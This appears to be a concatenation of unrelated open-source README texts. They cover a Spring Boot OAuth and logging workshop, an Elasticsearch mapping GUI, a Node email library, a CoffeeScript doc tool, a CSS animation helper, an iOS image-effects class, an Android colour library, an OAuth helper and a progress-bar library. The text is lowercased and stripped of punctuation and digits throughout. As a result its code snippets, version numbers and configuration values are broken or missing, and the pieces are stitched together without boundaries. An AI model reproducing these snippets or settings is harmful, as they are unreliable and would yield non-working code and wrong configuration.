clientdetailsserviceconfigurer  should define oauth clients in oauth identity is composed of some notion of a user bob  for example and a client bob s html client bob s iphone bob s android tablet etc different clients can make differnet guarantees about the amount of security they can support our example will define a simple client acme  with a secret password acmesecret  three authorized grant types authorizationcode  refreshtoken  password and a single scope openid you should be able to generate a new token using then send the access token to an oauth secured rest resource using thus far we ve looked at building applications with spring boot and spring cloud layering in the various technologies as we ve learned about them and needed them it s been a fun process of discovery hopefully  but this shouldn t be required for every developer instead you should package up best practices as spring boot starter dependencies and auto configurations codifying these best practices helps get past the endless list of non functional requirements required to go to production create a parent dependency that in turn defines all the git commit id plugins the executable jars etc package up common resources like logstash xml create a new stereotypical and task centric maven starter dependency that in turn brings in commonly used dependencies like org springframework cloud spring cloud starter zipkin  org springframework cloud spring cloud starter eureka  org springframework cloud spring cloud starter config  org springframework cloud spring cloud starter stream binder rabbit  org springframework boot spring boot starter actuator  net logstash logback logstash logback encoder    extract all the repeated code into auto configuration the alwayssampler bean enablediscoveryclient  the custom healthindicator s extra credit define a logger that is in turn a bean defined using spring framework s support for injectionpoint s you can qualify this bean with a custom qualifier logger for all the fancy new technologies we have today the venerable log file still reigns supreme modern logs are more than strings blurted out by code in the dead of night they should be structured data in this exercise we ll write our logs using logstash and then publish them to an elasticsearch cluster run and bin and elk sh add net logstash logback logstash logback encoder   to the reservation service and reservation client add logback xml to each project s resources directory it should be configured to point to the value of dockerhost or some dns entry import org slfj logger and org slfj loggerfactory declare a logger logger logger loggerfactory getlogger demoapplication class

extension c elasticsearch plugin install as elasticsearch plugin  other apps other apps gem is a gui for creating and managing an elasticsearch index s datastructure mappings es mappings provide an immutable interface to control how data is stored internally within elasticsearch and how queries can be applied to it mappings allow deciding things like should a field with value    be treated as a date or as a text field should san francisco be stored as an analyzed text field to then run full text search queries against it or should it be kept non analyzed for an aggregations use case should loc      be stored as object or should it have a geopoint datatype gem takes this a step further by providing an on the fly mapping inference based on user provided input data gem supports three key mapping related options today  create data mappings with an on the fly auto inferencing capability  managing all the current data mappings with an option to see the raw json data  importing new data analyzers to be later associated with field mappings gem keeps the entire app state in the url which makes for easy sharing of views and most importantly gem is entirely built on the client side and is available as a github hosted app a mapping in elasticsearch is like a schema in sql it s an api for defining how data should be internally stored within elasticsearch indexes a mapping can be created at the time of an elasticsearch index creation or afterwards in an explicit definition if no mapping is specified it is dynamically created when data is inserted into the index see an example here creating a mapping from data starting v  mappings are immutable once applied they cannot be modified in the event a mapping needs modification the suggested alternative is to reindex data in a new index sub fields allow indexing the same field in two different ways the idea is slightly counter intuitive if you come from a structured database background since elasticsearch is a search engine primarily data is indexed primarily in a search oriented data structure however it s necessary to index it in an exact format for exact search queries and aggregations not surprisingly sub fields only apply to a string field an analyzer is a pre processor that is applied to data before indexing it it does three things  sanitizing the string input  tokenizing the input into words  and filtering the tokens because of the focus on searching elasticsearch comes with a good number of standard analyzers that can be applied at mapping time to a data field however since there is so much room for customization it supports an interface to add custom analyzers gem also provides a gui interface to import a user defined analyzer and lists available analyzers to pick from at mapping time let s say your json data looks like this name geolocation data  place city new york  country united states location    gem also supports defining a type mapping directly for times when you have the exact definition the definition for the above data would like this properties name type string place properties city type string country type string location type geopoint for importing analyzer settings select the import analyzer button from the button group in the bottom left screen you can now add one ore more analyzers in the editor view to make them available at mapping creation time the following json can be used for some good defaults filter ngramfilter type edgengram  mingram  maxgram  tokenchars letter  digit  punctuation  symbol analyzer ngramanalyzer type custom  tokenizer

changes go here gh pages branch is for the github pages hosted version of the app it is just the stable version of the dev branch master branch is more suitable for installing gem locally the elasticsearch site plugin for gem uses master branch chrome extension branch is for publishing the chrome extension  git checkout master  npm install  bower install and build with npm run build the source code is in the app directory pull requests should be created against the dev branch gem is available as a hosted app and as a chrome extension bin and plugin install appbaseio and gem note to make sure you enable cors settings for your elasticsearch instance add the following lines in the es configuration file http port  http cors allow origin and and http cors enabled true http cors allow headers authorization x requested with content type content length http cors allow credentials true after installing the plugin start elasticsearch service elasticsearch and visit the following url to access it note if you use elasticsearch from a different port the url to access and the http cors allow origin value in the configuration file would change accordingly gem is purpose built for the mapping needs of an elasticsearch index together these three apps form the building blocks for powering a great search experience

15578117, campaign png  compose responsive email templates easily fill them with models and send them out this is the stuff responsible for sending beautiful emails in pony foo  i ve isolated that code and turned it into a reusable package called campaign it comes with a dead simple api and a beautiful responsive layout originally written by mailchimp   adapted by me it s also easily configurable and comes with nice conventions over configuration so you don t need to do a lot to get going being highly configurable is important to campaign  and for that reason it ships with several plugins to popular view engines campaign mustache  campaign jade  and campaign jadum you can use any of these to manage your email templates typically you ll want to use the same templating engine you use in your front end views for consistency across your codebase campaign can send emails through a variety of services using different plugins as well you could also create your own email service provider plugin quick links for reference extensible  pick a template engine and an email sending service or smtp and roll with it takes care of boring stuff css inlining media queries json ld plain text versions of your html takes care of important stuff batching requests providing a sane api view layouts etc provides debugging facilities for sending test emails and capturing output in a terminal session install using npm npm i save campaign set it up construct a client var client require campaign templateengine require campaign jade  provider require campaign mailgun apikey key rvasxx send emails client send template options done sub  detailed information below  and sub here is a screenshot of an email sent using this library as seen on pony foo  subscriptions in production this email is using the default layout provided by campaign sample png  there s a few configurable options here s an overview of the default values from null provider null templateengine null layout null formatting null headerimage null trap false the from address for our emails the provider is responsible for trying to make it look like that s the send address not necessarily used for authentication you can pick any supported email providers creating your own or choosing one providers that comes with campaign to implement a provider yourself you ll need to create a custom provider object the provider object should have a send function which takes a model  and a done callback you can read more about custom providers creating custom providers below available providers listed below you can use other template engines creating your own template engines you ll need to create a custom engine object with both render and renderstring methods note that template engines govern the default layouts if you implement your own engine you ll have to provide a default layout as well available engines listed below the layout used in your emails templates for email sending are meant to have the bare minimum needed to fill out an email since you want a consistent ux the same layout should be used for every email your product sends a default layout template is provided by supporting template engines you can provide a different one just set layout to the absolute path of a template file that s supported by your template engine for information about the model passed to the layout see the templates templates section when you want to customize html before submission but after your template engine and layout have been rendered into a single piece of html you can use the formatting option useful for tweaking css or markup in a global manner for all emails without having to touch the models every time function formatting html return change html you may provide the full path to an image this image will be encoded in base and embedded into the email as a heading embedding helps people view your emails offline this image should have a   ish ratio for instance i use x in my blog  s emails if true  then emails won t be sent to any recipients at all you could also set trap to nico bevacqua io  and all emails would be sent to me instead of the intended recipients great for spamming me and also great for testing when you trap recipients the email will get a nifty json at the end detailing the actual recipients that would ve gotten it once you ve created a client you can start sending emails here are the default options and what you need to fill out the from and trap fields are inherited from the configuration object passed to campaign  and they can be overridden on an email by email basis subject not provided  teaser options subject  from campaign from  trap campaign trap  to not provided  when yyyy and mm and dd hh mm utc z  images empty  attachments empty  social twitter not provided  landing not provided  name not provided provider tags not provided  merge not provided styles defaults the only difference between send and sendstring is that send takes the path to a file rather than the template itself send compiles the template and keeps it in a cache while sendstring compiles the template every time you can also use render or renderstring as the equivalents to both of these methods that will only render the emails as html this is useful for debugging and to render emails identically to what your customers see but handle the rendering logic yourself the email subject this is the line that most email clients show as a teaser for the email message it defaults to the subject line changing it is extremely encouraged these are the recipients of the email you re sending simply provide a single recipient s email address or an array of email addresses here you can pass a moment format string  eg um hh mm am dd mm yyyy the default format passed to moment is yyyy and mm and dd hh mm utc z a list of files you d like to attach to your emails name invoice  file path join dirname invoice png if you want to provide the template with embedded images  other than the optional email header headerimage when creating the campaign client  you can set images to a list of file paths and names to later reference them in your templates  as shown below name housing  file path join dirname housing png instead of a file you can provide a data value with the base encoded data and avoid the overhead of creating a temporary file if you choose this approach you must set the mime property as well name housing  mime image and png  data buff tostring base social metadata used when sending an email can help build your brand you can provide a twitter handle a name for your brand and a landing page the name is used as the name of the send address as well as in the visit name link configuration specifically used by the email sending provider many email providers allow you to add dynamic content to your templates for instance the feature is supported by both the campaign mailgun  and the campaign mandrill  providers out the box read more about merge variables  in mandrill providers have wildly different merge api in terms of how they want you to give them these recipient specific variables and how you can reference them in your templates campaign helps by providing a reasonable api and then deals with obscure provider data formats under the hood so you don t have to the following example shows merge variables for a couple emails and defaults that are used when a particular recipient doesn t have a value for a given variable someone accounting is something is a merge variable for the guy with that email someone else accounting is here is a merge variable for another peep whatever is a merge variable for everyone useful for defaults in your email templates you can reference these variables simply using something for values you wish to encode before embedding and here for embedding raw html note that this syntax is consistent regardless of whether you re using campaign mailgun  campaign mandrill  or something else mailgun   mandrill  and others let you tag your emails so that you can find different campaigns later on read more about tagging  by default emails will be tagged with the template name read about styles styling the layout below there are two types of templates the layout  and the email s body template a default layout is provided so let s talk about the email templates first and then the layout the body template determines what goes in the message body the options email sending options we used to configure our email are also used as the model for the body template as sometimes it might be useful to include some of that metadata in the model itself the api expects an absolute path to the body template client send body options done other than the options listed above email sending options  you can provide any values you want and then reference those in the template the layout has one fundamental requirement in order to be mildly functional it should have a body in it so that the actual email s content can be rendered luckily the default layout is good enough that you shouldn t need to touch it if you re building a custom layout body should be whatever expression is needed to render the unescaped body html purposely the layout template isn t passed the full model but only a subset containing header options header  subject options subject  preview options preview  generated when  body html  trapped options trapped  social options social  styles options style  linkeddata options linkeddata in this case the header variable would contain whether a header image was provided then generated contains the moment the email was rendered passing the yyyy and mm and dd hh mm utc z format string to moment  lastly trapped contains the metadata extracted from the model when trap is set to a truthy value   in the client options client options these are the default styles  and you can override them in the options passed to client send email sending options styles bodybackgroundcolor eaeadf  bodytextcolor   codefontfamily consolas menlo monaco lucida console  liberation mono  dejavu sans mono  bitstream vera sans mono  courier new  monospace serif  fontfamily helvetica  footerbackgroundcolor fff  headercolor   horizontalbordercolor dedede  layoutbackgroundcolor ffeb  layouttextcolor   linkcolor ecc  quotebordercolor cbcc custom layouts should either abide by these style rule names or provide entirely new ones here s a perfect use case for merge variables which were described above in the send options email sending options while many email service providers offer a way to unsubscribe readers their implementations don t quite align to one another so we favor using merge variables instead the default layout supports an optional unsubscribehtml merge variable which can be filled out like below this is rendered in the footer of every email campaign sends out merge someone somewhere com someone else com remember those are supported by mandrill mailgun and sparkpost but not every provider supports merge variables merge variables are processed after you make a request to their api with the provider replacing them with the values assigned to each recipient for more detail on merge variables for each provider you can read these docs mandrill merge variables  mailgun recipient variables  sparkpost substitution data  to help you debug an alternative provider is available set it up like this var campaign require campaign var client campaign provider require campaign terminal and and build and send mails as usual rather than actually sending emails you will get a bit of json output in your terminal and the markdown representation of your email s body html super useful during development terminal png  there are a few different providers you can use the recommended provider is to send emails through campaign mailgun  there is also a campaign terminal logging provider explained above debugging  and a nodemailer provider detailed below if the existing providers don t satisfy your needs you may provide your own the provider option just needs to be an object with a send method to create your own email sending provider you ll need to create a module that implements the interface methods found below see campaign mailgun  for an example on how you could implement your own email sending provider name my custom provider  and and mostly debugging purposes send function model done and and use the data in the model to send your email messages tweakplaceholder function property raw and and used to explain how merge variables should be rendered in the template e g if raw return html and property and return and property and if you decide to go for your own provider campaign will still prove useful thanks to its templating features which you can also extend the default provider included with campaign allows us to render layouts and views using mustache   but this behavior can be altered to use a custom templating engine to create your own template engine you ll need to create a module that implements the interface methods found below see campaign jadum  for an example on how you could implement your own template engine render function file model done renderstring function template model done defaultlayout and path and to and default and layout the done callback takes an error as the first argument and the resulting html as the second argument you re welcome to contribute to the development of campaign additional template engines and providers would be nice and i d encourage creating packages that solely contain that engine or email provider for instance you could create campaign ejs  or campaign postmark hmmm yeah that d be great lovely internet meme  changelog

npm install g codo you have to annotate your code with codo tags to give it some meaning to the parser that generates the documentation each tag starts with the sign followed by the tag name see the following overview for a minimal description of all available tags most tags are self explaining and the one that aren t are described afterwards in more detail tags can take multiple lines just indent subsequent lines by two spaces the following table shows the list of all available tags in alphabetical order with its expected options an option in parenthesis is optional and the square brackets are part of the codo tag format and must actually be written some tags can be defined multiple times and they can be applied to different contexts either in the comment for a class a comment for a mixin or in a method comment thead and thead tbody and tbody you can also use curly braces instead of square brackets if you prefer coffeescript move options comments if you solely use block comments you may want to use the cautious flag to disable the internal comment conversion coffeescript move the animal example move an animal new lion simba move south   param object options the moving options option options string direction the moving direction option options number speed the speed in mph move options if you want to compile your javascript with google closure and make use of the special block comments with an asterisk you want to use the closure flag so that codo ignores the asterisk there are two different format recognized for your parameters so you can chose your favorite this one is with the parameter after the parameter type coffeescript feed food and this one with the name before the type coffeescript feed food the parameter type can contain multiple comma separated types coffeescript do input each known type will be automatically linked also named parameters are recognized coffeescript class classmate param string name full name first and last param string phone phone number param obj picture jpg of the person constructor name phone picture param string reason why i m no longer friends param date revisitdecisionon when to reconsider unfriend reason revisitdecisionon if you have an object as parameter and you like to define the accepted properties as options to the method you can use the options tag coffeescript expectationoflife options the first parameter to the option tag is the parameter name it describes followed by the parameter type name and description the object types for the param  option and return tags are parsed for known classes or mixins and linked you can also define types for arrays with coffeescript getherdmembers regions you can mark an instance variable as property of the class by using the property tag like coffeescript class person property array string the nicknames nicknames in addition the following properties pattern is detected coffeescript class person get props definegetter name getter for name getter of props set props definesetter name setter for name setter of props property string the person name get name name set name name the persons age get age age if you follow this convention they will be shown in the generated documentation with its read and write status shown to specify type of the property use the property tag if you allow your method to take different parameters you can describe the method overloading with the overload tag coffeescript set args the overload tag must be followed by the alternative method signature that will appear in the documentation followed by any method tag indented by two spaces if you copy over functions from other objects without using mixins or concerns you can add documentation for this virtual or dynamic method with the method tag coffeescript class virtualmethods the method tag must be followed by the method signature that will appear in the documentation followed by any method tag indented by two spaces the difference to the overload tag beside the different context is that the signature should contain either the instance prefix or the class prefix it s common practice to mix in objects to share common logic when inheritance is not suited you can read simply mark any plain coffeescript object with the mixin tag to have a mixin page generated that supports many tags coffeescript example animal speed get the distance the animal will put back in a certain time param integer time number of seconds return integer the distance in miles distance time next mark the target object that includes one or multiple mixins coffeescript class example animal lion and you ll see the mixin methods appear as instance methods in the lion class documentation you can also extend a mixin coffeescript class example animal lion so its methods will show up as class methods a concern is a combination of two mixins one for instance methods and the other for class methods and it s automatically detected when a mixin has both a classmethods and an instancemethods property coffeescript example animal speed instancemethods get the distance the animal will put back in a certain time param integer time number of seconds return integer the distance in miles distance time classmethods get the common speed of the animal in mph param integer age the age of the animal return integer the speed in mph speed age you can use concern to include and extend the correspondent properties coffeescript class example animal lion you can also document your non class top level functions and constants within a file as soon codo detects these types within a file it will be added to the file list and you can browse your file methods and constants codo class mixin and method documentation and extra files written in the return  param  option  see  author  copyright  note  todo  since  version and deprecated tags rendered with a limited markdown syntax which means that only inline elements will be returned codo comments and all tag texts will be parsed for references to other classes methods and mixins and are automatically linked the reference searching will not take place within code blocks thus you can avoid reference searching errors by surround your code block that contains curly braces with backticks there are several ways of link types supported and all can take an optional label after the link link to a class or mixin animal lion or animal lion the mighty lion direct link to an instance method animal lion walk or animal lion walk the lion walks direct link to a class method animal lion constructor or animal lion constructor a new king was born direct link to a module method mymodule method or mymodule method zomg i can even refer modules the see tag supports the same link types just without the curly braces coffeescript after the installation you will have a codo binary that can be used to generate the documentation recursively for all coffeescript files within a directory codo help usage

39272429, generate css keyframe animations dynamically in the browser with javascript you describe them in js and it generates and inserts a style in the document head with a css keyframe animation this lets you dynamically calculate values based on positions and lets you actually run the animations performantly without having to deal with or run requestanimationframe loops i ll probably write a post about this approach i think it has some merits largely because requestanimationframe loops eat up battery power on mobile devices if left running and it s nice that once you ve registered an animation actually runnning it happens off of the main js thread plus as i said you don t have to write css with known values ahead of time normally css animations are declared in a separate css style sheet like so keyframes move transform translated  transform translated pxpx this can be a bit tedious to write even with preprocessors and becomes difficult if you want to dynamically change those fixed pixel values when your app is running in the browser what i wanted to be able to do was this var animations require create keyframe animation and and this creates the animation above animations registeranimation name move  and and the actual array of animation changes animation and and optional presets for when actually running the animation presets duration  easing linear  delay  and and then run it animations runanimation el move  function and and callback gets called when its done and and it also will return a promise if a promise global exists letting you easily chain animations

you give it an object they key is the keyframe so all the following are valid and identical animations registeranimation name move  animation start    end   animations registeranimation name move  animation        animations registeranimation name move  animation        animations registeranimation name move  and and when you give it an array the keyframe percentages are calculated and and

name specified on the nodes you pass in returns a promise if promise exists on the window object and you don t pass a callback this can be a single element an array of elements or the result of queryselectorall  jquery should work too but i don t use it so i haven t tested if this is a string it s assumed to be the name of the animation to run if you set presets when you registered the animation you can run them easily animations runanimation document queryselectorall dots  wigggle if you pass an object it has to contain the name animations runanimation document queryselectorall

4820703,  fximageview is a class designed to simplify the application of common visual effects such as reflections and drop shadows to images fximageview includes sophisticated queuing and caching logic to maximise performance when rendering these effects in real time as a bonus fximageview includes a standalone uiimage category for cropping scaling and applying effects directly to an image supported ios sdk versions  supported build target ios   xcode   apple llvm compiler   earliest supported deployment target ios   earliest compatible deployment target ios   note supported means that the library has been tested with this version compatible means that the library should work on this ios version i e it doesn t rely on any unavailable sdk features but is no longer being tested for compatibility and may require tweaking or bug fixes to run correctly arc compatibility  as of version   fximageview requires arc if you wish to use fximageview in a non arc project just add the fobjc arc compiler flag to the fximageview m class to do this go to the build phases tab in your target settings open the compile sources group double click fximageview m in the list and type fobjc arc into the popover if you wish to convert your whole project to arc comment out the error line in fximageview m then run the edit refactor convert to objective c arc tool in xcode and make sure all files that you wish to use arc for including fximageview m are checked thread safety  fximageview is derived from uiview and as with all uikit components it should only be accessed from the main thread fximageview uses threads internally to avoid blocking user interaction but fximageview s properties should only ever be accessed from the main thread the uiimage fx category methods are all thread safe and may safely be called concurrently from multiple threads on the same uiimage instance installation  to use fximageview just drag the class files into your project you can create fximageviews programatically or create them in interface builder by dragging an ordinary uiimageview into your view and setting its class to fximageview to install fximageview using cocoapods just add pod fximageview to your podfile and run pod install fximageview is fully carthage compatible to include it build your project with carthage then drag and carthage and build and ios and fximageview framework into your project and add this import import fximage and image h uiimage extension methods  uiimage imagecroppedtorect cgrect rect returns a copy of the image cropped to the specified rectangle in image coordinates uiimage imagescaledtosize cgsize size returns a copy of the image scaled to the specified size this method may change the aspect ratio of the image uiimage imagescaledtofitsize cgsize size returns a copy of the image scaled to fit the specified size without changing its aspect ratio the resultant image may be smaller than the size specified in one dimension if the aspect ratios do not match no padding will be added uiimage imagescaledtofillsize cgsize size returns a copy of the image scaled to fit the specified size without changing its aspect ratio if the image aspect ratio does not match the aspect ratio of the size specified the image will be cropped to fit uiimage imagecroppedandscaledtosize cgsize size contentmode uiviewcontentmode contentmode padtofit bool padtofit returns a copy of the image scaled and and or cropped to the specified size using the specified uiviewcontentmode this method is useful for matching the effect of uiviewcontentmode on an image when displayed in a uiimageview if the padtofit argument is no the resultant image may be smaller than the size specified is the aspect ratios do not match if padtofit is yes additional transparent pixels will be added around the image to pad it out to the size specified uiimage reflectedimagewithscale cgfloat scale returns a vertically reflected copy of the image that tapers off to transparent with a gradient the scale parameter determines that point at which the image tapers off and should have a value between   and   uiimage imagewithreflectionwithscale cgfloat scale gap cgfloat gap alpha cgfloat alpha returns a copy of the image that includes a reflection with the specified scale separation gap and alpha opacity the original image will be vertically centered within the new image with he space above the image padded out with transparent pixels matching the height of the reflection below this makes it easier to position the image within a uiimageview uiimage imagewithshadowcolor uicolor color offset cgsize offset blur cgfloat blur returns a copy of the image with a drop shadow rendered with the specified color offset and blur regardless of the offset value the original image will be vertically centered within the new image to make it easier to position the image within a uiimageview uiimage imagewithcornerradius cgfloat radius returns a copy of the image with the corners clipped to the specified curvature radius uiimage imagewithalpha cgfloat alpha returns a copy of the image with the specified alpha opacity the alpha is multiplied by the image s original alpha channel so this method can only be used to make the image more transparent not more opaque uiimage imagewithmask uiimage maskimage clips the image using the specified mask image the mask image should be an opaque greyscale alpha mask if you wish to use a transparent mask image use the maskimagefromimagealpha method to convert it to the correct format uiimage maskimagefromimagealpha this method extracts the alpha channel from an image that has an embedded alpha mask and returns it as a standalone greyscale mask image suitable for use with the imagewithmask method fximageview class methods  and nsoperationqueue processingqueue this is the shared nsoperationqueue used for queuing fximageview images for processing you can use this method to manipulate the maxconcurrentoperationcount for the queue which may be useful when fine tuning performance the default maximum concurrent operation count is  and nscache processedimagecache this is the shared nscache used to cache processed fximageview images for reuse ios automatically manages clearing this cache when ios runs low on memory but you may wish to manipulate the countlimit value or manually clear the cache at specific points in your app fximageview methods  void setimage uiimage image this method is the setter method for the image property see the image property documentation below void setimagewithcontentsoffile nsstring file this method sets the image by loading it from the specified file if the specified file is not an absolute path it is assumed to be a relative path within with the application bundle resources directory if the file does not include an extension it is assumed to be a png if the asynchronous property is set the file will be loaded on a background thread void setimagewithcontentsofurl nsurl url this method sets the image by loading it from the specified url if the asynchronous property is enabled the image will be loaded on a background thread the specified url can be either a local or remote file but note that loading remote urls in synchronous mode is not recommended as it will block the main thread for an indeterminate time fximageview properties  property nonatomic assign getter isasynchronous bool asynchronous the shadow and reflection effects take time to render in many cases this will be imperceptible but for high performance applications such as a scrolling carousel this rendering delay may cause stuttering in the animation this method toggles whether the shadow and reflection effects are applied immediately on the main thread asynchronous no  or rendered in a background thread asynchronous yes by rendering the effects in the background the performance issues can be avoided defaults to no property nonatomic assign nstimeinterval crossfadeduration this property controls the duration of the crossfade animation when the image finishes processing and is displayed measured in seconds the default duration is   set the duration to zero to disable the crossfade altogether property nonatomic assign cgfloat reflectiongap the gap between the image and its reflection measured in pixels or points on a retina display device this defaults to zero property nonatomic assign cgfloat reflectionscale the height of the reflection relative to the image should be in the range   to   defaults to   no reflection property nonatomic assign cgfloat reflectionalpha the opacity of the reflection should be in the range   to   defaults to   completely transparent property nonatomic strong uicolor shadowcolor the colour of the shadow defaults to black property nonatomic assign cgsize shadowoffset the offset for the shadow in points and pixels defaults to cgsizezero no shadow property nonatomic assign cgfloat shadowblur the softness of the image shadow defaults to zero which creates a hard shadow property nonatomic assign cgfloat cornerradius the radius of the curved corner clipping set this to zero to disable curved corners property nonatomic strong uiimage image this property is inherited from uiimageview but the behaviour is different setting this property does not set the image directly but instead applies the specified effects and then displays the processed image if the asynchronous property is set this processing happens in a background thread so the image will not appear immediately accessing the image property getter will return the original unprocessed image property nonatomic strong uiimage processedimage the resultant image after applying reflection and shadow effects it can sometimes be useful to set and get this directly for example you may wish to set a placeholder image whilst the image is being processed or retrieve and store the processed image so it can be cached for re use later without needing to be re generated from the original image note that fximageview already includes in memory caching of processed images property nonatomic copy uiimage customeffectsblock uiimage image if you want to apply a custom effect to your image you can do your custom drawing using the customeffectsblock property the block is passed the correctly cropped and scaled image and you code should return a new version with your custom effects applied your custom drawing block is applied prior to any other effects apart from cropping and scaling fximageview s caching mechanism doesn t know about your custom effects so if your app uses multiple effects blocks or your block relies on any external data you should update the customeffectsidentifier property so that the fximageview cache can handle it correctly note that you should ensure that your block code is thread safe if used in asynchronous mode property nonatomic copy nsstring cachekey fximageview caches processed images based on the image object or url that you specify combined with the specific set of effects you ve selected this mechanism works effectively in most cases but for image objects that are generated on the fly or ones that are loaded from the alassets library you don t get any benefit from the caching because the same image objects are never used twice in these cases you can improve performance by using a custom cache key the key can be any string the only requirement is that is should be unique for each unique image effects combination that you use with fximageview if you are displaying your images in a carousel a string based on the carousel item index would be a good choice for the cache key set the cachekey property to nil to revert to the default cache key calculation release notes  version

16224749, colours is available in maven central under the groupid code com github matthewyork and code and the artifactid code colourslibrary and code incorporate colours via gradle with compile com github matthewyork colourslibrary   and aar import the colours library into your workspace found in the colourslibrary folder right click on your android project folder and click on the project properties click on the android tab and then add under the library section select the colourslibrary project to link it with your project colours works exactly like the predefined android colors in fact the colour class is a subclass of android graphics color so you can actually use the code colour and code class where you normally use code color and code to gain access to the cool new methods of the colour library without losing any methods in the code color and code class to use your huge new palette of colors in xml reference a color just as you would a color in a local color xml resource file huzzah colours automagically integrates all of its colors to your project just as if you had defined them yourself you can tell all your friends that you made them we won t tell let s say however that you would like to set the color of something in code colours has you covered every single color available in xml is also avalable as a static method much like the android system colors to retrieve a predefined color s int representation simply call it s corresponding method int seashellcolor colour seashellcolor android comes pre baked with rgb and hsv color space methods however this may not be enough this library adds cmyk which is normally used for printing and cielab a color space meant for modeling an equal space between each color you can access these methods like so float cmyk colour colortocmyk inputcolor int color colour cmyktocolor cmyk float cielab colour colortocielab inputcolor int color colour cielabtocolor cielab beyond giving you a list of a ton of colors with no effort this category also gives you some methods that allow different color manipulations and translations here s how you use these generating white or black that contrasts with a color a lot of times you may want to put text on top of a view that is a certain color and you want to be sure that it will look good on top of it with this method you will return either white or black depending on the how well each of them contrast on top of it here s how you use this int contrastingcolor colour blackorwhitecontrastingcolor inputcolor generating a complementary color this method will create a color int that is the exact opposite color from another color int on the color wheel the same saturation and brightness are preserved only the hue is changed int complementarycolor colour complementarycolor inputcolor detecting a difference in two colors is not as trivial as it sounds one s first instinct is to go for a difference in rgb values leaving you with a sum of the differences of each point it looks great until you actually start comparing colors why do these two reds have a different distance than these two blues in real life vs computationally human visual perception is next in the line of things between a color and your brain some colors are just perceived to have larger variants inside of their respective areas than others so we need a way to model this human variable to colors enter cielab this color formulation is supposed to be this model so now we need to standardize a unit of distance between any two colors that works independent of how humans visually perceive that distance enter cie these are methods that use user tested data and other mathematically and statistically significant correlations to output this info you can read the wiki articles below to get a better understanding historically of how we moved to newer and better color distance formulas and what their respective pros and cons are finding distance double distance colour distancebetweencolorswithformula colora colorb colordistanceformulacie boolean isnoticablysimilar distance threshold resources you can create a  color scheme based off of a color using the following method it takes in a color int and one of the colorschemetypes defined in colours it returns an int of  new colors to create a pretty nice color scheme that complements

9153628, guardian logo avoid dealing with oauth logic in your code and spend more time creating your product guardian reduces the oauth footprint in your code to a single request built with modularity in mind guardian leverages plugins to handle oauth flows should you encounter a flow that guardian doesn t handle create a small flow plugin to do so and carry on guardian comes with  pre made plugins that cover  of oauth services not to mention guardian is perfect for both production and testing services like github require you to enter a single callback url this is fine when in production but move to another environment and soon you ll have conflicts require building complex services to juggle environment scenarios and more guardian is centralized and easily configurable to allow multiple

while authenticated from the api using tokens guardian provides in this manner the tests also serve as very good examples tests and of how to use guardian to run one of these test you ll need to have keys ready and run the following command k your consumer and client key and id s your consumer and client secret h host ie localhost or domain then visit the server running on port  to start the

16591292, ep tackles this css helpers that provide classes and attributes to deal with things like positioning growth style simulation etc const myep new ep document queryselector progress const makerequest myep simulate const xhttp new xmlhttprequest xhttp onreadystatechange function if this readystate  this status  myep complete xhttp open get  and index html  true xhttp send myep value myep set  makerequest makerequest and chrome and firefox and safari and opera and edge and ie  and  and and and and and and and and and smile and smile and smile and smile and smile and smile and in ie ensure that the max attribute is set when using specific values if no max is set the value won t go higher than  cry you have various options with how to use ep integrate the ep styles with your own sass by importing the parts you need you can grab a copy of ep through bower or npm bower install ep npm install jhy and ep progress background purple progress moz progress bar background purple progress webkit progress bar background purple progress webkit progress value background purple there is also a sass mixin included to as a shorthand to do this import ep and mixins progress include color bar purple if you choose to use the optional js helper you ll have access to the ep constructor class refer to the js api for further info const el document querysleect const myep new ep say you want to pick and choose pieces of ep simple this is actually the easiest way to override ep s configuration variables ep makes use of the default flag in sass to make this possible for example let s say we only want the core styles but we don t want any opacity and we want the primary color to be be purple ep fg purple ep opacity  import ep and core aesthetic helpers come in the form of classes ep top position absolute top ep bottom position absolute bottom ep fixed position fixed ep indeterminate show indeterminate state data complete complete progress set to  and hide more control with js helper data simulate slowly simulate progress in steps up to  over  seconds request timeout  can be configured and overrode data mock value mock progress for given number of seconds data staggered mock value mock progress but with staggered style data timer value use progress element as timer for given seconds data pause pauses any animation in place such as timer mock etc note  the mock  staggered mock  timer and simulate behaviors have duration defaults set in the source for example the max duration is set at  this is to keep the size down but these can easily be altered by building your own version of ep or adding rules for the durations you require for example i want the simulation to only take s and a timer that will take s progress data simulate animation duration s animation timing function steps  progress data timer  animation duration s ep leverages the default flag in sass so it s easier to override ep configuration variables simply set any of the following variables before importing ep ep ns ep set the class helper prefix ep indeterminate fg ep fg set the primary color when in indeterminate state ep timeout threshold  the time it takes for simulation to complete in seconds ep simulate max  at which value should simulation stop ep mocks min  minimum mocking duration in seconds ep mocks max  maximum mocking duration in seconds ep staggered mocks min  minimum staggered mock duration in seconds ep staggered mocks max  maximum staggered mock duration in seconds ep timers min  minimum timer duration in seconds ep timers max  maximum timer duration in seconds ep fg ecc ep opacity  and and import with default variables override import ep and core ep also has a mixin available for coloring progress elements simply pass a color to color bar you may use this without even importing the ep reset if you just want to color some progress elements import ep and mixins my progress element include color bar bffb const bar document queryselector progress const myep new ep bar it s main purpose is that it saves you the burden of having to set and remove attributes and classes but it also provides some nice to haves such as being able to hook into when progress is complete or set as for the methods available denotes an optional parameter togglepause toggles pause attribute for play and pause animation increase number value function cb increase progress value by optional increment with an optional callback by default increment is  decrease number value function cb decrease progress value by optional decrement with an optional callback by default decrement is  mock number duration bool staggered function cb mocks progress with a mocking animation optional duration in seconds optional staggered attribute defines which mock style use optional callback can be invoked when mock is complete by default duration is  time number duration function cb timing mock for using element as timer optional duration in seconds optional callback can be invoked when timer is complete by default duration is  complete function cb complete a progress bar by setting value to  and then resetting it provide optional callback for when complete yep you can easily integrate ep to communicate network request status to the end user the most basic example being something like the following const myep new ep document queryselector progress const makerequest myep simulate const xhttp new xmlhttprequest xhttp onreadystatechange function if this readystate  this status  myep complete xhttp open get  and index html  true xhttp send myep value myep set  makerequest makerequest we start with a simple progress element reset it to make sure it starts at  and start a simulation when we get the ok from our network request set our element to complete tada i d previously struck this off because i liked being able to add pseudo element progress bars to any element with relative ease where the pseudo elements were available however using pseudo elements to display progress isn t ideal and not very semantic it makes more sense to create something that can be integrated without big changes progre c ss is still available under the release tab if you really want it but realistically the code for progre c ss is as simple as progrecss before color green content height px left  opacity  position absolute top  for percent from  through  data progrecss value percent before width percent  ep is developed using webpack  webpack dev server  babel and sass it uses a self documented makefile for development make setup make develop

